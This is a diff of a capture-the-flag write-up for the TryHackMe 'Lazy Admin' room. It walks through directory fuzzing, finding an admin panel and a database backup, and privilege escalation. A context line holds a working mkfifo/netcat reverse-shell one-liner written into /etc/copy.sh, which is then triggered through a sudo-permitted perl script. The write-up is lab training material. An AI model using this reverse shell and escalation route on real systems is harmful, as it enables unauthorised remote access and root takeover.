@@ -19,7 +19,7 @@ Let's try fuzzing even deeper, we can do this with the command ```ffuf -w /usr/s
 
 ```/as``` seems interesting, so lets check it out, oh an admin panel. We could try to brute-force it, but let's continue searching to see if we can find anything else that might be interesting.
 
-<insert image>
+![login](https://github.com/nicolai-h/tryhackme/blob/main/lazy_admin/images/login.png)
 
 We can find an backup of an mysql database at ```<ip>/content/inc/mysql_backup```, lets try downloading it and opening it.
 
@@ -65,7 +65,7 @@ Ok, now lets check out the ```/etc/copy.sh``` file.
 
 It seems like most of the job is done for us. Let's change the ip to our ip. We can do this with ```echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your_ip> 5554 >/tmp/f" > /etc/copy.sh```
 
-We can now try to catch it with netcat on our computer with ```nc -nvlp 5554``` and then run the file with ```sudo /usr/bin/perl /home/itguy/backup.pl```
+We can now try to catch it with netcat on our computer with ```nc -nvlp 5554``` and then run ``backup.pl`` with ```sudo /usr/bin/perl /home/itguy/backup.pl```
 
 ![root](https://github.com/nicolai-h/tryhackme/blob/main/lazy_admin/images/root.png)
 
